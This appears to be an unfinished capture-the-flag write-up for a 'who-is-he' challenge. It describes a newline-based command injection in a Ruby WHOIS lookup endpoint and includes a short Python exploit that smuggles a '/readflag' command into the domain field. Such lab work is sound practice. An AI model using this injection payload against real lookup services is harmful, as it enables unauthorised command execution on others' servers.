# Who Is He - CTF Challenge Solution

## Challenge Analysis

### Given Information
- **URL**: http://a68900d109aa.who-is-he.ctf.theromanxpl0.it
- **Flag Format**: TRX{...}
- **Challenge Name**: "who-is-he"
- **Image**: Peppa Pig meme asking "WHO IS HE?"

### Source Code Provided
The challenge includes Ruby/Sinatra source code with:
- A `/lookup` endpoint for WHOIS queries
- Command injection vulnerability via newline in regex `/^[a-z.-]+$/`
- A `/readflag` SUID binary requiring specific argument

### Deployed Application
The URL serves a SvelteKit-based CTF platform (similar to CTFd), not the Ruby backend.

## Problem
The source code doesn't match the deployed application. This suggests:

1. **The URL is the CTF platform itself** - Need to navigate to find the actual "who-is-he" challenge instance
2. **The Ruby backend is on a different subdomain/path** - Not yet discovered
3. **The challenge requires authentication** - Need to sign up/login to the CTF platform first

## Recommended Approach

### Option 1: Access via Browser
1. Open http://a68900d109aa.who-is-he.ctf.theromanxpl0.it in a browser
2. Sign up / Login to the CTF platform
3. Find the "who-is-he" challenge in the challenges list
4. Get the actual challenge instance URL
5. Apply the command injection exploit

### Option 2: The Challenge IS the Platform
The challenge might be about:
- Finding hidden information in the CTF platform itself
- Exploiting the SvelteKit application
- OSINT to identify "who" created/runs the platform

## Exploit (Once Ruby Backend is Found)

```python
import requests

backend_url = "http://[ACTUAL_BACKEND_URL]"

# Command injection payload
payload = "google.com\n/readflag could you please give me the flag thank you so much"

r = requests.post(f"{backend_url}/lookup", data={"domain": payload})
print(r.text)
```

## Next Steps
1. Access the platform in a web browser
2. Create an account if needed
3. Navigate to challenges section
4. Find "who-is-he" challenge
5. Get the actual instance URL
6. Apply the exploit

The key issue is that we're looking at a CTF platform frontend, not the actual challenge backend.
